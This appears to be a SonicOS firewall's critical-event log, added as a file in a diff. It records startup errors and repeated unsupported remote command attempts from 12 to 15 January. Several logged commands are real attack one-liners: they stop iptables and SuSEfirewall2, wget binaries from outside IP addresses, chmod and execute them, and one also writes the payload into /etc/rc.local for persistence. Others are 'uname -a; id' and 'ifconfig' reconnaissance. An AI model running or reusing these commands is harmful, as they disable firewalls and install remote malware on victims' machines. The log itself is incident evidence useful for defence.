@@ -1,0 +1,887 @@
+Last File:
+file: /ata0/log7.dat, time: Jan 21 09:42:22
+Firmware Version: SonicOS Enhanced 6.2.2.2-19n
+Directory: /home/qa1/ng-3600-prod/SonicOS/6.2.2/m2/target/oct_mips64/sw_octeon3600-cp-base
+Build Time: Jun  1 2015, 14:55:39
+Uname: Linux panther.eng.sonicwall.com 3.14.19-100.fc19.x86_64 #1 SMP Wed Sep 17 22:05:21 UTC 20
+log core 00: num exceptions 0, state events logged 0, missed 0 - critical events logged 862, missed 0
+-------critial (non-wrapping) log:
+01/12 11:30:17.400: startup - *** exception reboot ***
+01/12 11:30:25.256: CRITICAL - Informational: validatePolicyManagement:1829: 
+01/12 11:30:25.256: CRITICAL - An invalid WAN to LAN policy for Any -> Server_183 Services from Any to Server_183 Public was disabled: Can't mix management / non-management services
+01/12 11:30:25.368: CRITICAL - Informational: validatePolicyManagement:1829: 
+01/12 11:30:25.368: CRITICAL - An invalid DMZ to LAN policy for Any -> Server_183 Services from Any to Server_183 Public was disabled: Can't mix management / non-management services
+01/12 11:30:26.224: CRITICAL - Informational: paramUpdateSslvpnServerCertName:19005: 
+01/12 11:30:26.224: CRITICAL - failed to init a temp sslvpn ctx
+01/12 11:30:26.416: CRITICAL - Informational: netObjPostImportChecks:5658: 
+01/12 11:30:26.416: CRITICAL - Number of NAC Profile objects after import (5) does not match the number imported (0) !!!
+01/12 11:30:52.032: CRITICAL - Informational: wdTaskInit:517: 
+01/12 11:30:52.032: CRITICAL - Hardware watchdog time (5368 ms) is less than expectation (20000 ms)
+01/12 11:39:18.848: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 12:26:18.096: fatal - Read from socket failed: errno = 0x3a, connection_in 77
+01/12 13:13:20.080: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 14:00:17.048: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 14:12:35.128: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 14:30:18.256: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/lhhmzw;chmod 777 lhhmzw;./lhhmzw;'
+01/12 14:41:49.416: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:8080/duge_L24;chmod 755 duge_L24;./duge_L24;'
+01/12 14:47:18.480: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 14:52:17.432: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/lhhmzw;chmod 777 lhhmzw;./lhhmzw;'
+01/12 14:52:22.128: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/lhhmzw;chmod 777 lhhmzw;./lhhmzw;'
+01/12 15:07:04.528: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://118.193.161.143:801/bbs;chmod 755 bbs;./bbs;'
+01/12 15:11:56.048: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/12 15:20:30.656: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/lhhmzw;chmod 777 lhhmzw;./lhhmzw;'
+01/12 15:34:20.672: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/12 15:49:09.032: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 16:21:32.864: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 16:24:35.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 16:41:02.432: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/12 16:59:58.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 17:08:41.416: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 17:11:07.352: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 17:33:28.240: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/12 17:35:15.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 17:44:07.400: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/lhhmzw;chmod 777 lhhmzw;./lhhmzw;'
+01/12 17:44:10.288: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/lhhmzw;chmod 777 lhhmzw;./lhhmzw;'
+01/12 17:55:47.800: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/12 18:10:42.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 18:42:46.544: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 18:46:02.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 19:21:30.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 19:29:39.416: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 19:51:37.416: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:8080/China1991;chmod 777 China1991;./China1991;'
+01/12 19:56:51.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 20:16:34.864: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 20:32:23.336: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 20:53:54.928: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/12 21:03:29.736: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 21:08:03.112: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 21:21:16.368: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/12 21:32:03.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 21:43:18.944: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 21:50:23.160: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 22:05:22.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 22:18:37.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 22:24:01.112: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 22:37:18.048: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/12 22:38:37.560: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 22:42:41.352: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/12 22:54:53.016: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 23:11:44.096: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 23:24:08.048: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/12 23:30:25.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/12 23:44:56.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 00:11:01.576: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 00:17:56.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 00:18:22.736: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/13 00:51:00.672: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 00:57:51.288: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 01:24:13.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 01:44:41.848: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 01:57:12.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 02:30:08.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 02:31:31.224: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 03:03:07.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 03:18:19.576: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 03:25:13.336: fatal - Read from socket failed: errno = 0x36, connection_in 53
+01/13 03:36:02.784: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 04:05:02.320: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 04:09:01.672: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 04:14:23.016: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/13 04:41:58.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/13 04:51:43.192: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 05:38:27.896: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 06:25:09.080: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 06:42:13.640: fatal - Read from socket failed: errno = 0x36, connection_in 77
+01/13 07:11:53.128: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 07:58:37.512: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/13 08:26:30.624: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/13 08:45:22.224: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 09:32:11.560: fatal - Read from socket failed: errno = 0x3a, connection_in 77
+01/13 09:34:15.128: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/13 10:19:06.352: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 11:06:04.064: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/13 11:53:03.080: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 12:40:05.160: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/13 14:47:12.272: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/13 16:23:31.480: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/13 16:32:48.736: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 16:40:25.592: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/13 16:42:28.480: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 16:52:24.160: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 17:02:43.768: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 17:13:24.432: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 17:24:17.832: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 17:35:18.480: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 17:46:30.512: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 17:57:58.864: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 18:09:42.928: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 18:21:45.448: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 18:34:12.272: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 18:46:59.160: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 19:00:05.064: fatal - do_exec_no_pty not supported in SonicOS command 'uname -a; id; uname -a; uname -a; id ; uname -a'
+01/13 21:58:13.800: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/13 23:20:57.688: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/13 23:49:15.928: fatal - Read from socket failed: errno = 0x36, connection_in 53
+01/14 02:49:58.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 03:22:42.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 03:55:19.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 04:27:55.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 04:44:57.176: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/14 04:57:03.416: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/14 04:58:11.208: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/14 05:00:34.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 05:10:54.256: fatal - do_exec_no_pty not supported in SonicOS command 'wget -c http://222.186.56.119:7932/armv6;chmod 777 armv6;./armv6;'
+01/14 05:33:06.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 05:59:03.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 06:06:09.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 06:39:23.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 07:12:50.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 07:20:39.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 07:46:08.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 07:50:32.016: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 07:59:54.656: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/14 08:19:43.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 08:20:15.480: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 08:46:42.688: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 08:50:01.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 08:52:54.256: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/ffhj44;chmod 777 ffhj44;./ffhj44;'
+01/14 08:53:06.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 09:20:36.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 09:29:46.592: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 09:33:36.464: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 09:50:40.944: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 09:58:49.784: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/14 10:03:53.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 10:20:28.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 10:20:34.288: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 10:30:33.400: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://23.234.30.41:2299/c891;chmod 777 c891;./c891;echo "cd /tmp/">>/etc/rc.local;echo "./c891&">>/et
+01/14 10:32:04.432: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/ffhj44;chmod 777 ffhj44;./ffhj44;'
+01/14 10:50:16.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 11:07:32.064: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 11:19:58.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 11:49:43.368: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 11:54:29.384: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 12:19:20.000: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 12:21:02.768: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 12:41:31.864: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 12:48:58.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 13:18:50.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 13:28:32.016: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 13:48:28.016: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/14 14:15:31.784: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 15:02:29.384: fatal - Read from socket failed: errno = 0x3a, connection_in 77
+01/14 15:25:11.304: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/14 15:49:32.912: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/14 16:36:33.752: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 17:23:40.256: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 17:30:03.048: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/14 17:51:49.160: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/14 18:10:44.672: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 18:57:40.080: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 19:44:35.656: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 20:31:29.864: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/14 21:18:26.752: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 22:02:14.544: fatal - do_exec_no_pty not supported in SonicOS command 'echo -n test'
+01/14 22:05:29.480: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 22:23:10.048: fatal - do_exec_no_pty not supported in SonicOS command 'echo -n test'
+01/14 22:44:29.416: fatal - do_exec_no_pty not supported in SonicOS command 'echo -n test'
+01/14 22:52:24.848: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/14 23:39:18.528: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/15 00:26:10.896: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/15 00:59:34.624: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/15 01:09:10.736: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 01:13:03.432: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/15 01:59:52.816: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 02:46:43.656: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 03:04:37.352: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/15 03:05:11.288: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/15 03:33:33.080: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 04:15:53.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:15:59.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:06.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:14.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:18.592: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:26.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:33.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:40.368: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:47.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:16:54.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:01.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:06.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:13.560: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:19.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:26.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:30.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:35.336: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:41.160: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:46.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:50.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:54.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:17:58.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:03.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:07.672: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:11.736: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:16.096: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:19.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:23.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:28.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:32.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:36.496: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:40.656: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:44.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:48.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:53.112: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:18:57.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:01.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:05.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:09.832: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:13.800: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:17.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:22.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:26.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:30.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:34.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:38.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:42.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:47.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:51.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:19:55.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:00.096: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:04.512: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:08.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:12.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:16.560: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:18.128: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/15 04:20:20.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:24.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:28.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:33.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:37.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:41.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:46.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:50.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:54.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:20:58.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:02.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:06.944: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:12.032: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:18.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:24.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:30.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:35.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:39.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:43.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:47.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:51.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:21:56.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:02.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:07.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:11.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:15.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:19.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:23.864: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:28.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:32.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:36.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:40.592: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:44.864: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:48.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:53.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:22:57.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:01.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:05.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:09.800: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:13.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:17.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:22.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:26.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:30.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:35.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:40.736: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:45.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:50.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:54.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:23:59.160: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:03.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:08.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:12.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:16.736: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:22.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:28.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:34.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:40.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:46.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:52.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:24:57.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:01.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:05.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:10.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:15.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:19.656: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:23.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:28.592: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:33.032: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:38.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:42.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
